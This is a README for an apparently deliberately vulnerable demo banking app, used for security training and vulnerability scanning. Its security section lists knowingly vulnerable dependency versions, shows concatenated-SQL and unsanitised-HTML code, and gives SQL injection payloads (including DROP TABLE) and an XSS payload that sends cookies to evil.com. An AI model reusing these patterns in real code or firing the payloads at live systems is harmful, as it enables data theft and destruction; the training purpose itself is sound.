# Luminous Banking Application

A comprehensive banking web application built as a monorepo with three core components.

## Architecture

```
banking-app-main/
├── backend/          # Java Spring Boot API
├── frontend/         # React TypeScript Web UI
├── ai-workflow/      # Python OpenAI Interest Rate Service
└── docker-compose.yml
```

## Components

### 1. Backend (Java Spring Boot)
RESTful API service handling all banking operations:
- Account management (open, close, view)
- Fund transfers
- Profile management
- Transaction history

### 2. Frontend (React TypeScript)
Modern web application with:
- Beautiful, responsive UI
- Client-side routing
- Luminous brand styling
- Dashboard and account management interfaces

### 3. AI Workflow (Python + OpenAI)
Intelligent interest rate qualification service:
- Analyzes customer profile data
- Determines personalized interest rates
- Uses OpenAI for intelligent decision-making

## Quick Start

### Prerequisites
- Docker & Docker Compose
- Java 17+
- Node.js 18+
- Python 3.11+

### Running with Docker Compose

```bash
docker-compose up --build
```

Services will be available at:
- Frontend: http://localhost:3000
- Backend API: http://localhost:8080
- AI Workflow: http://localhost:8000

### Running Locally

#### Backend
```bash
cd backend
./mvnw spring-boot:run
```

#### Frontend
```bash
cd frontend
npm install
npm run dev
```

#### AI Workflow
```bash
cd ai-workflow
pip install -r requirements.txt
python main.py
```

## API Documentation

Once the backend is running, access Swagger UI at:
http://localhost:8080/swagger-ui.html

## Environment Variables

### Backend
- `DATABASE_URL` - PostgreSQL connection string
- `AI_SERVICE_URL` - AI workflow service URL

### Frontend
- `VITE_API_URL` - Backend API URL

### AI Workflow
- `OPENAI_API_KEY` - Your OpenAI API key

## ⚠️ Security Vulnerabilities (Educational Demo)

This application contains **intentional security vulnerabilities** for training and educational purposes. **DO NOT deploy to production!**

### Vulnerable Packages

#### Backend (Java)
| Package | Version | CVE | Description |
|---------|---------|-----|-------------|
| log4j-core | 2.14.1 | CVE-2021-44228 | Log4Shell - Remote code execution |
| jackson-databind | 2.12.3 | CVE-2020-36518 | Denial of service |
| commons-text | 1.9 | CVE-2022-42889 | Text4Shell - Code execution |
| snakeyaml | 1.30 | CVE-2022-1471 | Remote code execution |

#### Frontend (JavaScript)
| Package | Version | CVE | Description |
|---------|---------|-----|-------------|
| axios | 0.21.1 | CVE-2021-3749 | ReDoS vulnerability |
| lodash | 4.17.20 | CVE-2021-23337 | Command injection |
| node-forge | 0.9.0 | CVE-2020-7720 | Prototype pollution |
| serialize-javascript | 2.1.0 | CVE-2020-7660 | Remote code execution |
| shell-quote | 1.7.2 | CVE-2021-42740 | Command injection |
| underscore | 1.12.0 | CVE-2021-23358 | Arbitrary code execution |

#### AI Workflow (Python)
| Package | Version | CVE | Description |
|---------|---------|-----|-------------|
| PyYAML | 5.3.1 | CVE-2020-14343 | Arbitrary code execution |
| Jinja2 | 2.11.2 | CVE-2020-28493 | ReDoS vulnerability |
| urllib3 | 1.25.8 | CVE-2020-26137 | CRLF injection |
| Pillow | 8.0.0 | CVE-2021-25287 | Buffer overflow |
| cryptography | 3.3.1 | CVE-2020-36242 | Integer overflow |
| paramiko | 2.7.1 | CVE-2022-24302 | Race condition |

### Vulnerable Code Patterns

#### SQL Injection (`/api/v1/search/*`)
The search endpoints use string concatenation for SQL queries:
```java
// VULNERABLE - DO NOT USE
String sql = "SELECT * FROM customers WHERE name LIKE '%" + userInput + "%'";
```

**Attack Examples:**
- `' OR '1'='1` - Returns all records
- `'; DROP TABLE customers; --` - Destructive query
- `' UNION SELECT * FROM accounts --` - Data exfiltration

#### XSS (Cross-Site Scripting) (`/search` page)
The frontend renders user input without sanitization:
```jsx
// VULNERABLE - DO NOT USE
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Attack Examples:**
- `<script>alert('XSS')</script>`
- `<img src=x onerror="alert('XSS')">`
- `<svg onload="document.location='http://evil.com/steal?cookie='+document.cookie">`

### How to Demo

1. Start the application with `docker-compose up`
2. Navigate to the "⚠️ Vuln Demo" page in the sidebar
3. Try the attack payloads in the search boxes
4. Observe how the SQL queries are executed and XSS payloads render

### Security Scanning

Run Snyk to detect vulnerabilities:
```bash
# Scan all components
snyk test --all-projects

# Scan specific components
cd backend && snyk test
cd frontend && snyk test
cd ai-workflow && snyk test
```

## License

MIT License - Luminous Banking © 2024

